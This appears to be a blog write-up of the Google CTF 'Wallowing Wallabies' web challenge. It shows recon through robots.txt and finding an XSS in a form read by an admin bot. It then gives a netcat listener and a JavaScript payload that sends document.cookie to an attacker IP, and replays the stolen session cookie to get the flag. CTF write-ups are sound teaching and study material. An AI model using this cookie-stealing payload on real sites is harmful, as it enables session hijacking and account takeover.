---
layout: post
title: Google CTF - Wallowing Wallabies - Part One
comments: true
---

This post is about the [Wallowing Wallabies](https://wallowing-wallabies.ctfcompetition.com/) web challenge of the [Google CTF](https://capturetheflag.withgoogle.com).

On the website, we are greeted by this beautiful page:
![Wallowing Wallabies home page](/public/img/2016/05/03/Google-CTF-Wallowing-Wallabies-part-one/homepage.png)

As interesting as this page is, I quickly moved to the `sitemap.xml` (none were found) and to the `robots.txt`:

```
User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters
Disallow: /deep-blue-sea/team/paragraphs
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors
```

After trying all the URLs, I found that the vendors one was interesting.

![Wallowing Wallabies Vendors](/public/img/2016/05/03/Google-CTF-Wallowing-Wallabies-part-one/vendors.png)

That's interesting. It is obviously a form where you put text that will be read by an administrator (or a bot in our case). Let's see if it's possible to do a [XSS injection](https://en.wikipedia.org/wiki/Cross-site_scripting). We will start by checking if the HTML tags are displayed to the page:

``` html
<h1>XSS</h1>
```

And we receive

![Wallowing Wallabies Vendor submission confirmation with XSS hint](/public/img/2016/05/03/Google-CTF-Wallowing-Wallabies-part-one/vendors-hint.png)

So the `<h1>` didn't work, but we get told that they expect our form to contains `<script src=`. We can conclude that this challenge is really an XSS.

Now that we know what we can do, we have to find out what to do. The first thing to think about when we control a page that will be viewed by someone (especially an admin) is that we can steal his **session cookie**.

To steal a cookie, one can redirect the current user viewing the page to a page under our control, with the cookies appended to the URL. Note that this is a lazy way to do it and it might fail in some cases if the cookie is longer than the max length of the URL. Hopefully, this is not our case, so we can be lazy.

The first thing to do is to setup a server to receive the cookie. I used netcat as it is easy to setup and we only need to listen to one connection. Note that if you are behind a router, you will need to redirect the port you use to your computer. I will leave this as an exercise to the reader.

Start your "web server":

``` bash
netcat -l -p 8085 #-l is to listen -p is to specify the port
```

Now we need our JavaScript payload to redirect the user. Once again I don’t want to host the script, and the website wants to receive `<script src=`, so I just append it to my script to make the check pass.

``` html
<script>
  window.location = "http://YOUR_IP_ADDRESS:8085/" + document.cookie;
</script>
<script src=""></script>
```

The admin (bot) will load the page with your script in it, and you will see the URL containing the cookie in the netcat terminal. Don’t forget to **URL decode** the cookie.

Your cookie should look something like this:

```
green-mountains=eyJub25jZSI6IjU5M2E3ZmRjNDFhNGYxYTAiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjA1MTA0M30=|1462051040|92ceb6fb03f0501199c4399ca3cf870bccd6ffd2
```

The cookie is named `green-mountains` and the value is everything after the first `=`. We can see that it's in 3 parts separated by `|`. The first part looks like Base64 (you can tell because it's all **alphanumeric** and end with an `=`). If you decode it, you get:

``` json
{"nonce":"593a7fdc41a4f1a0","allowed":"^/deep-blue-sea/team/vendors.*$","expiry":1462051043}
```

The interesting part is the `allowed`, which seems to give access to our **vendor** website. We will set the cookie in the browser. You can do it by pasting that in the console:

``` js
document.cookie = "green-mountains=eyJub25jZSI6IjU5M2E3ZmRjNDFhNGYxYTAiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjA1MTA0M30=|1462051040|92ceb6fb03f0501199c4399ca3cf870bccd6ffd2";
```

When you access the [vendor](https://wallowing-wallabies.ctfcompetition.com/deep-blue-sea/team/vendors) page: **Voilà!** You get your flag!

![Wallowing Wallabies Vendor page with blurred flag](/public/img/2016/05/03/Google-CTF-Wallowing-Wallabies-part-one/vendors-flag.png)
